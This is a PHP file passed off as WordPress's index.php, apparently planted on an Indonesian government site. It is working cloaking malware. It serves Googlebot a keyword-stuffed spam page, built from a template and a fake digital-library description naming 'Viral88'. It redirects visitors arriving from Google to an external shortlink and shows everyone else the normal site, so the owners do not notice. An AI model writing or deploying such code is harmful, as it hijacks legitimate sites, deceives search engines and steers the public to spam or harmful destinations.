<?php
$config = array(
    'url'        => 'https://kec.baturetno.wonogirikab.go.id/',
    'parameter'  => 'id',
    'template'   => 'template.php',
    'shorlink'   => 'https://t.ly/kejariagam',
    'amp'        => '#',
);

$html = file_get_contents($config['template']);
$shortlink = $config['shorlink'];

function index(){
    /**
     * Front to the WordPress application. This file doesn't do anything, but loads
     * wp-blog-header.php which does and tells WordPress to load the theme.
     *
     * @package WordPress
     */

    /**
     * Tells WordPress to load the WordPress theme and output it.
     *
     * @var bool
     */
    define( 'WP_USE_THEMES', true );

    /** Loads the WordPress Environment and Template */
    require __DIR__ . '/wp-blog-header.php';
}


$userAgent = $_SERVER['HTTP_USER_AGENT'] ?? '';
$referer = $_SERVER['HTTP_REFERER'] ?? '';
// Cek apakah User Agent dan Referer sesuai dengan yang diinginkan
if (strpos($userAgent, 'Googlebot') !== false || strpos($userAgent, 'Google-InspectionTool') !== false) {
    if(isset($_GET['perkara']))
    {
        $keyword= $_GET['perkara'];
        $brand = trim($keyword);
        $amp = $config['amp'] . $brand;
        $url = $config['url'] . '?' . $config['parameter'] . '=' . urlencode($brand);
        $brands = strtoupper($brand);
        $brandss = strtolower($brand);
        $title = "$brands Login : Perpustakaan Digital Platform STIDAR";
        $deskripsi = "$brands adalah platform perpustakaan digital yang dirancang khusus untuk mendukung kebutuhan akademik di STIDAR. Dengan akses mudah ke ribuan koleksi buku, jurnal, dan referensi digital, Viral88 memberikan pengalaman belajar yang lebih praktis dan efisien.";
        $html = str_replace('{{ TITLE }}', $title, $html);
        $html = str_replace('{{ DESCRIPTION }}', $deskripsi, $html);
        $html = str_replace('{{ BRAND }}', $brands, $html);
        $html = str_replace('{{ BRANDS }}', $brandss, $html);
        $html = str_replace('{{ URL }}', $url, $html);
        $html = str_replace('{{ AMP }}', $amp, $html);
        $html = str_replace('{{ SHORTLINK }}', $shortlink, $html);
        echo $html;
    }else{
        header("Location: $shortlink");
        exit;
    }
}else if (isset($_SERVER['HTTP_REFERER']) && (strpos($_SERVER['HTTP_REFERER'], 'google.co.id') !== false || strpos($_SERVER['HTTP_REFERER'], 'google.com') !== false)) {
    header("Location: $shortlink");
    exit;
} else {
   index();
}
